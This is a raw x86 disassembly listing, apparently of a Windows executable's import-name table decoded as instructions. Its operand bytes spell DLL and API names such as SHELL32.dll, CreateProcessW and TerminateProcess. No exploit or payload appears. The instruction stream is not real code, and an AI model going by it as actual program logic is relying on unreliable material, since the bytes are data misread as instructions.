  408b0b:	add    BYTE PTR [esi],bh
  408b0d:	add    DWORD PTR [edi+0x65],eax
  408b10:	je     0x408b56
  408b12:	ins    BYTE PTR es:[edi],dx
  408b13:	addr16 dec ecx
  408b15:	je     0x408b7c
  408b17:	ins    DWORD PTR es:[edi],dx
  408b18:	add    BYTE PTR [eax],al
  408b1a:	jmp    0x64aed01f
  408b1f:	inc    esp
  408b20:	imul   esp,DWORD PTR [ecx+0x6c],0xb300676f
  408b27:	add    BYTE PTR [ecx+ebp*2+0x61],al
  408b2b:	ins    BYTE PTR es:[edi],dx
  408b2c:	outs   dx,DWORD PTR ds:[esi]
  408b2d:	addr16 inc edx
  408b2f:	outs   dx,DWORD PTR ds:[esi]
  408b30:	js     0x408b82
  408b32:	popa   
  408b33:	jb     0x408b96
  408b35:	ins    DWORD PTR es:[edi],dx
  408b36:	push   edi
  408b37:	add    BYTE PTR [ebp+0x53],dl
  408b3a:	inc    ebp
  408b3b:	push   edx
  408b3c:	xor    esi,DWORD PTR [edx]
  408b3e:	cs fs ins BYTE PTR es:[edi],dx
  408b41:	ins    BYTE PTR es:[edi],dx
  408b42:	add    BYTE PTR [eax],al
  408b44:	outs   dx,DWORD PTR ds:[esi]
  408b45:	add    BYTE PTR [edi+0x58],bl
  408b48:	arpl   WORD PTR [eax+0x74],si
  408b4b:	inc    esi
  408b4c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  408b54:	pop    edi
  408b55:	pop    edi
  408b56:	jo     0x408bb7
  408b58:	pop    edi
  408b59:	arpl   WORD PTR [edi+0x6d],bp
  408b5c:	ins    DWORD PTR es:[edi],dx
  408b5d:	outs   dx,DWORD PTR ds:[esi]
  408b5e:	fs add BYTE PTR gs:[eax],al
  408b62:	adc    DWORD PTR [ecx],eax
  408b64:	pop    edi
  408b65:	popa   
  408b66:	ins    DWORD PTR es:[edi],dx
  408b67:	jae    0x408bd0
  408b69:	pop    edi
  408b6a:	gs js  0x408bd6
  408b6d:	je     0x408b6f
  408b6f:	add    cl,dh
  408b71:	add    BYTE PTR [edi+0x5f],bl
  408b74:	ja     0x408bdd
  408b76:	gs je  0x408be6
  408b79:	popa   
  408b7a:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  408b81:	add    dl,ah
  408b83:	add    BYTE PTR [edi+0x5f],bl
  408b86:	jae    0x408bed
  408b88:	je     0x408be9
  408b8a:	popa   
  408b8b:	jo     0x408bfd
  408b8d:	pop    edi
  408b8e:	je     0x408c09
  408b90:	jo     0x408bf7
  408b92:	add    BYTE PTR [eax],al
  408b94:	scas   al,BYTE PTR es:[edi]
  408b95:	add    al,0x65
  408b97:	js     0x408c02
  408b99:	je     0x408b9b
  408b9b:	add    BYTE PTR [ebx+0x1],dh
  408b9e:	pop    edi
  408b9f:	gs js  0x408c0b
  408ba2:	je     0x408ba4
  408ba4:	and    al,0x1
  408ba6:	pop    edi
  408ba7:	arpl   WORD PTR [ebp+0x78],sp
  408baa:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  408bb2:	jo     0x408c13
  408bb4:	pop    edi
  408bb5:	ins    WORD PTR es:[edi],dx
  408bb7:	outs   dx,DWORD PTR ds:[esi]
  408bb8:	fs add BYTE PTR gs:[eax],al
  408bbc:	in     al,0x0
  408bbe:	pop    edi
  408bbf:	pop    edi
  408bc0:	jae    0x408c27
  408bc2:	je     0x408c39
  408bc4:	jae    0x408c2b
  408bc6:	jb     0x408c35
  408bc8:	popa   
  408bc9:	je     0x408c33
  408bcb:	gs jb  0x408c40
  408bce:	add    BYTE PTR [eax],al
  408bd0:	call   0x6ea9ead6
  408bd5:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  408bdd:	add    al,0x5f
  408bdf:	ja     0x408c44
  408be1:	ins    DWORD PTR es:[edi],dx
  408be2:	fs ins BYTE PTR es:[edi],dx
  408be4:	outs   dx,BYTE PTR ds:[esi]
  408be5:	add    BYTE PTR ds:0x65743f00,dh
  408beb:	jb     0x408c5a
  408bed:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  408bf4:	pop    ecx
  408bf5:	inc    ecx
  408bf6:	pop    eax
  408bf7:	pop    eax
  408bf8:	pop    edx
  408bf9:	add    BYTE PTR [ebp+0x73],ch
  408bfc:	jbe    0x408c61
  408bfe:	jb     0x408c74
  408c00:	cs fs ins BYTE PTR es:[edi],dx
  408c03:	ins    BYTE PTR es:[edi],dx
  408c04:	add    BYTE PTR [eax],al
  408c06:	aaa    
  408c07:	add    DWORD PTR [edi+0x63],ebx
  408c0a:	outs   dx,DWORD PTR ds:[esi]
  408c0b:	outs   dx,BYTE PTR ds:[esi]
  408c0c:	je     0x408c80
  408c0e:	outs   dx,DWORD PTR ds:[esi]
  408c0f:	ins    BYTE PTR es:[edi],dx
  408c10:	data16 jo 0x408c13
  408c13:	add    BYTE PTR [edx+0x1],ch
  408c16:	pop    edi
  408c17:	gs js  0x408c7d
  408c1a:	gs jo  0x408c91
  408c1d:	pop    edi
  408c1e:	push   0x6c646e61
  408c23:	gs jb  0x408c5a
  408c26:	pop    edi
  408c27:	arpl   WORD PTR [edi+0x6d],bp
  408c2a:	ins    DWORD PTR es:[edi],dx
  408c2b:	outs   dx,DWORD PTR ds:[esi]
  408c2c:	outs   dx,BYTE PTR ds:[esi]
  408c2d:	add    BYTE PTR [ebx+0x4f],al
  408c30:	dec    ebp
  408c31:	inc    ebx
  408c32:	push   esp
  408c33:	dec    esp
  408c34:	xor    esi,DWORD PTR [edx]
  408c36:	cs fs ins BYTE PTR es:[edi],dx
  408c39:	ins    BYTE PTR es:[edi],dx
  408c3a:	add    BYTE PTR [eax],al
  408c3c:	cmp    al,0x1
  408c3e:	push   ebx
  408c3f:	dec    eax
  408c40:	inc    ebp
  408c41:	jbe    0x408ca4
  408c43:	ins    BYTE PTR es:[edi],dx
  408c44:	jne    0x408ca7
  408c46:	je     0x408cad
  408c48:	push   ebx
  408c49:	jns    0x408cbe
  408c4b:	je     0x408cb2
  408c4d:	ins    DWORD PTR es:[edi],dx
  408c4e:	inc    ebx
  408c4f:	outs   dx,DWORD PTR ds:[esi]
  408c50:	ins    DWORD PTR es:[edi],dx
  408c51:	ins    DWORD PTR es:[edi],dx
  408c52:	popa   
  408c53:	outs   dx,BYTE PTR ds:[esi]
  408c54:	fs push esp
  408c56:	gs ins DWORD PTR es:[edi],dx
  408c58:	jo     0x408cc6
  408c5a:	popa   
  408c5b:	je     0x408cc2
  408c5d:	add    BYTE PTR [edx+0x50485301],cl
  408c63:	popa   
  408c64:	jb     0x408cd9
  408c66:	gs inc esp
  408c68:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  408c6f:	popa   
  408c70:	ins    DWORD PTR es:[edi],dx
  408c71:	add    BYTE PTR gs:[eax],al
  408c74:	push   ebx
  408c75:	dec    eax
  408c76:	inc    ebp
  408c77:	dec    esp
  408c78:	dec    esp
  408c79:	xor    esi,DWORD PTR [edx]
  408c7b:	cs fs ins BYTE PTR es:[edi],dx
  408c7e:	ins    BYTE PTR es:[edi],dx
  408c7f:	add    BYTE PTR [eax+eax*1+0x65444853],bh
  408c86:	ins    BYTE PTR es:[edi],dx
  408c87:	gs je  0x408cef
  408c8a:	push   esi
  408c8b:	popa   
  408c8c:	ins    BYTE PTR es:[edi],dx
  408c8d:	jne    0x408cf4
  408c8f:	push   edi
  408c90:	add    BYTE PTR [eax],al
  408c92:	mov    DWORD PTR [eax],0x65474853
  408c98:	je     0x408cf0
  408c9a:	popa   
  408c9b:	ins    BYTE PTR es:[edi],dx
  408c9c:	jne    0x408d03
  408c9e:	push   edi
  408c9f:	add    BYTE PTR [ebp+0x0],cl
  408ca2:	push   eax
  408ca3:	popa   
  408ca4:	je     0x408d0e
  408ca6:	inc    esi
  408ca7:	imul   ebp,DWORD PTR [esi+0x64],0x656c6946
  408cae:	dec    esi
  408caf:	popa   
  408cb0:	ins    DWORD PTR es:[edi],dx
  408cb1:	gs push edi
  408cb3:	add    BYTE PTR [ebx+0x48],dl
  408cb6:	dec    esp
  408cb7:	push   edi
  408cb8:	inc    ecx
  408cb9:	push   eax
  408cba:	dec    ecx
  408cbb:	cs fs ins BYTE PTR es:[edi],dx
  408cbe:	ins    BYTE PTR es:[edi],dx
  408cbf:	add    BYTE PTR [edx+0x0],al
  408cc2:	inc    ebx
  408cc3:	outs   dx,DWORD PTR ds:[esi]
  408cc4:	push   ebp
  408cc5:	outs   dx,BYTE PTR ds:[esi]
  408cc6:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  408ccd:	imul   edi,DWORD PTR [edx+0x65],0x2d0000
  408cd4:	push   ebx
  408cd5:	ins    BYTE PTR es:[edi],dx
  408cd6:	gs gs jo 0x408cda
  408cda:	and    BYTE PTR [eax],al
  408cdc:	inc    edi
  408cdd:	gs je  0x408d33
  408ce0:	je     0x408d43
  408ce2:	jb     0x408d58
  408ce4:	jne    0x408d56
  408ce6:	dec    ecx
  408ce7:	outs   dx,BYTE PTR ds:[esi]
  408ce8:	outs   dx,WORD PTR ds:[esi]
  408cea:	push   edi
  408ceb:	add    BYTE PTR [ecx],dl
  408ced:	add    BYTE PTR [ebp+0x6e],dl
  408cf0:	push   0x6c646e61
  408cf5:	gs fs inc ebp
  408cf8:	js     0x408d5d
  408cfa:	gs jo  0x408d71
  408cfd:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  408d04:	gs jb  0x408d07
  408d07:	add    BYTE PTR [edi],cl
  408d09:	add    BYTE PTR [ebx+0x65],dl
  408d0c:	je     0x408d63
  408d0e:	outs   dx,BYTE PTR ds:[esi]
  408d0f:	push   0x6c646e61
  408d14:	gs fs inc ebp
  408d17:	js     0x408d7c
  408d19:	gs jo  0x408d90
  408d1c:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  408d23:	gs jb  0x408d26
  408d26:	or     al,0x0
  408d28:	inc    edi
  408d29:	gs je  0x408d6f
  408d2c:	jne    0x408da0
  408d2e:	jb     0x408d95
  408d30:	outs   dx,BYTE PTR ds:[esi]
  408d31:	je     0x408d83
  408d33:	jb     0x408da4
  408d35:	arpl   WORD PTR [ebp+0x73],sp
  408d38:	jae    0x408d3a
  408d3a:	dec    ebx
  408d3b:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  408d3f:	ins    DWORD PTR es:[edi],dx
  408d40:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  408d47:	outs   dx,DWORD PTR ds:[esi]
  408d48:	arpl   WORD PTR [ebp+0x73],sp
  408d4b:	jae    0x408d4d
  408d4d:	add    BYTE PTR [eax],dl
  408d4f:	add    BYTE PTR [edi+0x65],al
  408d52:	je     0x408da1
  408d54:	outs   dx,DWORD PTR ds:[esi]
  408d55:	fs jne 0x408dc4
  408d58:	gs dec eax
  408d5a:	popa   
  408d5b:	outs   dx,BYTE PTR ds:[esi]
  408d5c:	fs ins BYTE PTR es:[edi],dx
  408d5e:	gs inc ecx
  408d60:	add    BYTE PTR [eax],al
  408d62:	add    BYTE PTR [eax],al
  408d64:	push   ecx
  408d65:	jne    0x408dcc
  408d67:	jb     0x408de2
  408d69:	push   eax
  408d6a:	gs jb  0x408dd3
  408d6d:	outs   dx,DWORD PTR ds:[esi]
  408d6e:	jb     0x408ddd
  408d70:	popa   
  408d71:	outs   dx,BYTE PTR ds:[esi]
  408d72:	arpl   WORD PTR [ebp+0x43],sp
  408d75:	outs   dx,DWORD PTR ds:[esi]
  408d76:	jne    0x408de6
  408d78:	je     0x408ddf
  408d7a:	jb     0x408d7c
  408d7c:	or     eax,0x74654700
  408d81:	inc    ebx
  408d82:	jne    0x408df6
  408d84:	jb     0x408deb
  408d86:	outs   dx,BYTE PTR ds:[esi]
  408d87:	je     0x408dd9
  408d89:	jb     0x408dfa
  408d8b:	arpl   WORD PTR [ebp+0x73],sp
  408d8e:	jae    0x408dd9
  408d90:	add    BYTE PTR fs:[ecx],dl
  408d93:	add    BYTE PTR [edi+0x65],al
  408d96:	je     0x408ddb
  408d98:	jne    0x408e0c
  408d9a:	jb     0x408e01
  408d9c:	outs   dx,BYTE PTR ds:[esi]
  408d9d:	je     0x408df3
  408d9f:	push   0x64616572
  408da4:	dec    ecx
  408da5:	add    BYTE PTR fs:[eax],al
  408da8:	adc    al,0x0
  408daa:	inc    edi
  408dab:	gs je  0x408e01
  408dae:	jns    0x408e23
  408db0:	je     0x408e17
  408db2:	ins    DWORD PTR es:[edi],dx
  408db3:	push   esp
  408db4:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  408dbb:	ins    BYTE PTR es:[edi],dx
  408dbc:	gs push esp
  408dbe:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  408dc5:	gs je  0x408e1c
  408dc8:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  408dcf:	je     0x408dd1
  408dd1:	add    BYTE PTR [ecx],al
  408dd3:	add    BYTE PTR [ebx+0x6f],al
  408dd6:	ins    DWORD PTR es:[edi],dx
  408dd7:	jo     0x408e3a
  408dd9:	jb     0x408e40
  408ddb:	push   ebx
  408ddc:	je     0x408e50
  408dde:	imul   ebp,DWORD PTR [esi+0x67],0x6964724f
  408de5:	outs   dx,BYTE PTR ds:[esi]
  408de6:	popa   
  408de7:	ins    BYTE PTR es:[edi],dx
  408de8:	add    BYTE PTR [eax],al
  408dea:	adc    al,0x0
  408dec:	push   edx
  408ded:	gs addr16 inc edi
  408df0:	gs je  0x408e49
  408df3:	popa   
  408df4:	ins    BYTE PTR es:[edi],dx
  408df5:	jne    0x408e5c
  408df7:	push   edi
  408df8:	add    BYTE PTR [eax],al
  408dfa:	push   es
  408dfb:	add    BYTE PTR [ebx+0x72],al
  408dfe:	gs popa 
  408e00:	je     0x408e67
  408e02:	inc    ebp
  408e03:	jbe    0x408e6a
  408e05:	outs   dx,BYTE PTR ds:[esi]
  408e06:	je     0x408e5f
  408e08:	add    BYTE PTR [eax],al
  408e0a:	sub    DWORD PTR [eax],eax
  408e0c:	push   ebx
  408e0d:	gs je  0x408e55
  408e10:	jbe    0x408e77
  408e12:	outs   dx,BYTE PTR ds:[esi]
  408e13:	je     0x408e15
  408e15:	add    BYTE PTR [edi],dl
  408e17:	add    BYTE PTR [edi+ebp*2+0x61],cl
  408e1b:	fs dec esp
  408e1d:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  408e24:	js     0x408e7d
  408e26:	add    BYTE PTR [eax],al
  408e28:	sbb    al,0x0
  408e2a:	inc    edi
  408e2b:	gs je  0x408e84
  408e2e:	gs jb  0x408ea4
  408e31:	imul   ebp,DWORD PTR [edi+0x6e],0x577845
  408e38:	aas    
  408e39:	add    BYTE PTR [ebx+0x6f],al
  408e3c:	push   esp
  408e3d:	popa   
  408e3e:	jae    0x408eab
  408e40:	dec    ebp
  408e41:	gs ins DWORD PTR es:[edi],dx
  408e43:	inc    esi
  408e44:	jb     0x408eab
  408e46:	add    BYTE PTR gs:[edi],al
  408e49:	add    BYTE PTR [edi+0x65],al
  408e4c:	je     0x408e9f
  408e4e:	jne    0x408eb5
  408e50:	jne    0x408eb7
  408e52:	fs inc ebx
  408e54:	outs   dx,DWORD PTR ds:[esi]
  408e55:	ins    DWORD PTR es:[edi],dx
  408e56:	jo     0x408ec4
  408e58:	gs je  0x408ec4
  408e5b:	outs   dx,DWORD PTR ds:[esi]
  408e5c:	outs   dx,BYTE PTR ds:[esi]
  408e5d:	push   ebx
  408e5e:	je     0x408ec1
  408e60:	je     0x408ed7
  408e62:	jae    0x408e64
  408e64:	add    eax,DWORD PTR [eax]
  408e66:	inc    ebx
  408e67:	jb     0x408ece
  408e69:	popa   
  408e6a:	je     0x408ed1
  408e6c:	dec    ecx
  408e6d:	outs   dx,DWORD PTR ds:[esi]
  408e6e:	inc    ebx
  408e6f:	outs   dx,DWORD PTR ds:[esi]
  408e70:	ins    DWORD PTR es:[edi],dx
  408e71:	jo     0x408edf
  408e73:	gs je  0x408edf
  408e76:	outs   dx,DWORD PTR ds:[esi]
  408e77:	outs   dx,BYTE PTR ds:[esi]
  408e78:	push   eax
  408e79:	outs   dx,DWORD PTR ds:[esi]
  408e7a:	jb     0x408ef0
  408e7c:	add    BYTE PTR [eax],al
  408e7e:	add    eax,0x74654700
  408e83:	dec    esp
  408e84:	popa   
  408e85:	jae    0x408efb
  408e87:	inc    ebp
  408e88:	jb     0x408efc
  408e8a:	outs   dx,DWORD PTR ds:[esi]
  408e8b:	jb     0x408e8d
  408e8d:	add    BYTE PTR [edi],cl
  408e8f:	add    BYTE PTR [edi+0x65],al
  408e92:	je     0x408ee7
  408e94:	jns    0x408f09
  408e96:	je     0x408efd
  408e98:	ins    DWORD PTR es:[edi],dx
  408e99:	inc    esp
  408e9a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408ea1:	jns    0x408efa
  408ea3:	add    BYTE PTR ds:0x74615000,al
  408ea9:	push   0x41686343
  408eae:	jo     0x408f20
  408eb0:	outs   dx,BYTE PTR gs:[esi]
  408eb2:	add    BYTE PTR fs:[edi],dh
  408eb5:	add    BYTE PTR [edx+0x65],dl
  408eb8:	jae    0x408f2f
  408eba:	ins    DWORD PTR es:[edi],dx
  408ebb:	gs push esp
  408ebd:	push   0x64616572
  408ec2:	add    BYTE PTR [eax],al
  408ec4:	xor    eax,0x69615700
  408ec9:	je     0x408f11
  408ecb:	outs   dx,DWORD PTR ds:[esi]
  408ecc:	jb     0x408f1b
  408ece:	jne    0x408f3c
  408ed0:	je     0x408f3b
  408ed2:	jo     0x408f40
  408ed4:	gs dec edi
  408ed6:	bound  ebp,QWORD PTR [edx+0x65]
  408ed9:	arpl   WORD PTR [ebx+esi*2+0x45],si
  408edd:	js     0x408edf
  408edf:	add    BYTE PTR [ebp+0x0],al
  408ee2:	inc    ebx
  408ee3:	outs   dx,DWORD PTR ds:[esi]
  408ee4:	push   edi
  408ee5:	popa   
  408ee6:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  408eee:	je     0x408f59
  408ef0:	jo     0x408f5e
  408ef2:	gs dec eax
  408ef4:	popa   
  408ef5:	outs   dx,BYTE PTR ds:[esi]
  408ef6:	fs ins BYTE PTR es:[edi],dx
  408ef8:	gs jae 0x408efb
  408efb:	add    BYTE PTR [ebx],dl
  408efd:	add    BYTE PTR [ebx+0x6f],al
  408f00:	inc    edi
  408f01:	gs je  0x408f45
  408f04:	jo     0x408f67
  408f06:	jb     0x408f7c
  408f08:	ins    DWORD PTR es:[edi],dx
  408f09:	outs   dx,BYTE PTR gs:[esi]
  408f0b:	je     0x408f61
  408f0d:	jns    0x408f7f
  408f0f:	add    BYTE PTR gs:[eax],al
  408f12:	sbb    BYTE PTR [eax],al
  408f14:	inc    edi
  408f15:	gs je  0x408f68
  408f18:	jb     0x408f89
  408f1a:	arpl   WORD PTR [ebp+0x73],sp
  408f1d:	jae    0x408f68
  408f1f:	add    BYTE PTR fs:[eax],al
  408f22:	dec    esp
  408f23:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  408f27:	ins    DWORD PTR es:[edi],dx
  408f28:	imul   ebp,DWORD PTR [esi+0x61],0x68546574
  408f2f:	jb     0x408f96
  408f31:	popa   
  408f32:	add    BYTE PTR fs:[eax],bh
  408f35:	add    BYTE PTR [ebx+0x65],dl
  408f38:	je     0x408f8a
  408f3a:	jb     0x408fa5
  408f3c:	outs   dx,DWORD PTR ds:[esi]
  408f3d:	jb     0x408fa8
  408f3f:	je     0x408fba
  408f41:	inc    ebx
  408f42:	ins    BYTE PTR es:[edi],dx
  408f43:	popa   
  408f44:	jae    0x408fb9
  408f46:	add    BYTE PTR [eax],al
  408f48:	add    DWORD PTR [eax],eax
  408f4a:	inc    ebp
  408f4b:	jbe    0x408fb2
  408f4d:	outs   dx,BYTE PTR ds:[esi]
  408f4e:	je     0x408f95
  408f50:	outs   dx,BYTE PTR ds:[esi]
  408f51:	popa   
  408f52:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  408f56:	add    BYTE PTR [eax],al
  408f58:	push   ds
  408f59:	add    BYTE PTR [edi+0x65],al
  408f5c:	je     0x408fb5
  408f5e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  408f65:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408f6c:	jns    0x408fc5
  408f6e:	add    BYTE PTR [eax],al
  408f70:	add    DWORD PTR [eax],eax
  408f72:	inc    ebx
  408f73:	push   0x6f4c7261
  408f78:	ja     0x408fdf
  408f7a:	jb     0x408fd3
  408f7c:	add    BYTE PTR [eax],al
  408f7e:	push   es
  408f7f:	add    BYTE PTR [ecx+0x73],cl
  408f82:	inc    ebx
  408f83:	push   0x6c417261
  408f88:	jo     0x408ff2
  408f8a:	popa   
  408f8b:	dec    esi
  408f8c:	jne    0x408ffb
  408f8e:	gs jb  0x408ffa
  408f91:	arpl   WORD PTR [edi+0x0],dx
  408f94:	add    eax,DWORD PTR [eax]
  408f96:	push   edx
  408f97:	gs addr16 inc ebx
  408f9a:	jb     0x409001
  408f9c:	popa   
  408f9d:	je     0x409004
  408f9f:	dec    ebx
  408fa0:	gs jns 0x408fe8
  408fa3:	js     0x408ffc
  408fa5:	add    BYTE PTR [ecx],ah
  408fa7:	add    BYTE PTR [edx+0x65],dl
  408faa:	addr16 push ecx
  408fac:	jne    0x409013
  408fae:	jb     0x409029
  408fb0:	dec    ecx
  408fb1:	outs   dx,BYTE PTR ds:[esi]
  408fb2:	outs   dx,WORD PTR ds:[esi]
  408fb4:	dec    ebx
  408fb5:	gs jns 0x40900f
  408fb8:	add    BYTE PTR [eax],al
  408fba:	add    al,0x0
  408fbc:	push   eax
  408fbd:	popa   
  408fbe:	je     0x409028
  408fc0:	inc    ebx
  408fc1:	arpl   WORD PTR [eax+0x41],bp
  408fc4:	fs fs inc ebp
  408fc7:	js     0x40903d
  408fc9:	outs   dx,BYTE PTR gs:[esi]
  408fcb:	jae    0x409036
  408fcd:	outs   dx,DWORD PTR ds:[esi]
  408fce:	outs   dx,BYTE PTR ds:[esi]
  408fcf:	add    BYTE PTR [edi],al
  408fd1:	add    BYTE PTR [ebx+0x74],dl
  408fd4:	popa   
  408fd5:	jb     0x40904b
  408fd7:	push   esp
  408fd8:	jb     0x40903b
  408fda:	arpl   WORD PTR [ebp+0x57],sp
  408fdd:	add    BYTE PTR [ecx],cl
  408fdf:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  408fe3:	gs je  0x40904b
  408fe6:	inc    esi
  408fe7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x45000100
  408fef:	outs   dx,BYTE PTR ds:[esi]
  408ff0:	popa   
  408ff1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  408ff5:	jb     0x409058
  408ff7:	arpl   WORD PTR [ebp+0x45],sp
  408ffa:	js     0x40902e
  408ffc:	add    BYTE PTR [eax],al
  408ffe:	or     BYTE PTR [eax],al
  409000:	push   ebx
  409001:	je     0x409072
  409003:	jo     0x409059
  409005:	jb     0x409068
  409007:	arpl   WORD PTR [ebp+0x57],sp
  40900a:	add    BYTE PTR [eax],al
  40900c:	pop    es
  40900d:	add    BYTE PTR [edi+0x69],dl
  409010:	fs gs inc ebx
  409013:	push   0x6f547261
  409018:	dec    ebp
  409019:	jne    0x409087
  40901b:	je     0x409086
  40901d:	inc    edx
  40901e:	jns    0x409094
  409020:	add    BYTE PTR gs:[ecx+0x70],ah
  409024:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  40902e:	outs   dx,DWORD PTR ds:[esi]
  40902f:	jb     0x409096
  409031:	sub    eax,0x2d6d6f63
  409036:	ins    BYTE PTR es:[edi],dx
  409037:	xor    DWORD PTR ds:0x2e312d31,ebp
  40903d:	fs ins BYTE PTR es:[edi],dx
  40903f:	ins    BYTE PTR es:[edi],dx
  409040:	add    BYTE PTR [eax],al
  409042:	popa   
  409043:	jo     0x4090ae
  409045:	sub    eax,0x772d736d
  40904a:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409051:	sub    eax,0x636e7973
  409056:	push   0x2d316c2d
  40905b:	xor    ch,BYTE PTR ds:0x6c642e30
  409061:	ins    BYTE PTR es:[edi],dx
  409062:	add    BYTE PTR [eax],al
  409064:	popa   
  409065:	jo     0x4090d0
  409067:	sub    eax,0x772d736d
  40906c:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409073:	sub    eax,0x636f7270
  409078:	gs jae 0x4090ee
  40907b:	je     0x4090e5
  40907d:	jb     0x4090e4
  40907f:	popa   
  409080:	fs jae 0x4090b0
  409083:	ins    BYTE PTR es:[edi],dx
  409084:	xor    DWORD PTR ds:0x2e322d31,ebp
  40908a:	fs ins BYTE PTR es:[edi],dx
  40908c:	ins    BYTE PTR es:[edi],dx
  40908d:	add    BYTE PTR [ecx+0x70],ah
  409090:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  40909a:	outs   dx,DWORD PTR ds:[esi]
  40909b:	jb     0x409102
  40909d:	sub    eax,0x6f727265
  4090a2:	jb     0x40910c
  4090a4:	popa   
  4090a5:	outs   dx,BYTE PTR ds:[esi]
  4090a6:	fs ins BYTE PTR es:[edi],dx
  4090a8:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  4090af:	xor    DWORD PTR ds:0x6c642e31,ebp
  4090b5:	ins    BYTE PTR es:[edi],dx
  4090b6:	add    BYTE PTR [eax],al
  4090b8:	popa   
  4090b9:	jo     0x409124
  4090bb:	sub    eax,0x772d736d
  4090c0:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4090c7:	sub    eax,0x7262696c
  4090cc:	popa   
  4090cd:	jb     0x409148
  4090cf:	ins    BYTE PTR es:[edi],dx
  4090d0:	outs   dx,DWORD PTR ds:[esi]
  4090d1:	popa   
  4090d2:	fs gs jb 0x409103
  4090d6:	ins    BYTE PTR es:[edi],dx
  4090d7:	xor    DWORD PTR ds:0x2e302d32,ebp
  4090dd:	fs ins BYTE PTR es:[edi],dx
  4090df:	ins    BYTE PTR es:[edi],dx
  4090e0:	add    BYTE PTR [eax],al
  4090e2:	popa   
  4090e3:	jo     0x40914e
  4090e5:	sub    eax,0x772d736d
  4090ea:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4090f1:	sub    eax,0x666f7270
  4090f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  4090fe:	sub    eax,0x6c642e30
  409103:	ins    BYTE PTR es:[edi],dx
  409104:	add    BYTE PTR [eax],al
  409106:	popa   
  409107:	jo     0x409172
  409109:	sub    eax,0x772d736d
  40910e:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409115:	sub    eax,0x69737973
  40911a:	outs   dx,BYTE PTR ds:[esi]
  40911b:	outs   dx,WORD PTR ds:[esi]
  40911d:	sub    eax,0x322d316c
  409122:	sub    eax,0x6c642e31
  409127:	ins    BYTE PTR es:[edi],dx
  409128:	add    BYTE PTR [eax],al
  40912a:	popa   
  40912b:	jo     0x409196
  40912d:	sub    eax,0x772d736d
  409132:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409139:	sub    eax,0x69727473
  40913e:	outs   dx,BYTE PTR ds:[esi]
  40913f:	addr16 sub eax,0x312d316c
  409145:	sub    eax,0x6c642e30
  40914a:	ins    BYTE PTR es:[edi],dx
  40914b:	add    BYTE PTR [ecx+0x70],ah
  40914e:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409158:	outs   dx,DWORD PTR ds:[esi]
  409159:	jb     0x4091c0
  40915b:	sub    eax,0x69676572
  409160:	jae    0x4091d6
  409162:	jb     0x4091dd
  409164:	sub    eax,0x312d316c
  409169:	sub    eax,0x6c642e30
  40916e:	ins    BYTE PTR es:[edi],dx
  40916f:	add    BYTE PTR [ecx+0x70],ah
  409172:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  40917c:	outs   dx,DWORD PTR ds:[esi]
  40917d:	jb     0x4091e4
  40917f:	sub    eax,0x6c2d6f69
  409184:	xor    DWORD PTR ds:0x2e312d31,ebp
  40918a:	fs ins BYTE PTR es:[edi],dx
  40918c:	ins    BYTE PTR es:[edi],dx
  40918d:	add    BYTE PTR [ecx+0x70],ah
  409190:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  40919a:	outs   dx,DWORD PTR ds:[esi]
  40919b:	jb     0x409202
  40919d:	sub    eax,0x68746170
  4091a2:	sub    eax,0x312d316c
  4091a7:	sub    eax,0x6c642e30
  4091ac:	ins    BYTE PTR es:[edi],dx
  4091ad:	add    BYTE PTR [ecx+0x70],ah
  4091b0:	imul   ebp,DWORD PTR ds:0x772d736d,0x652d6e69
  4091ba:	jbe    0x409221
  4091bc:	outs   dx,BYTE PTR ds:[esi]
  4091bd:	je     0x409228
  4091bf:	outs   dx,BYTE PTR ds:[esi]
  4091c0:	addr16 sub eax,0x766f7270
  4091c6:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x2d316c2d
  4091ce:	xor    DWORD PTR ds:0x6c642e30,ebp
  4091d4:	ins    BYTE PTR es:[edi],dx
  4091d5:	add    BYTE PTR [ecx+0x70],ah
  4091d8:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4091e2:	outs   dx,DWORD PTR ds:[esi]
  4091e3:	jb     0x40924a
  4091e5:	sub    eax,0x69727473
  4091ea:	outs   dx,BYTE PTR ds:[esi]
  4091eb:	addr16 sub eax,0x312d326c
  4091f1:	sub    eax,0x6c642e30
  4091f6:	ins    BYTE PTR es:[edi],dx
  4091f7:	add    BYTE PTR [ecx+0x70],ah
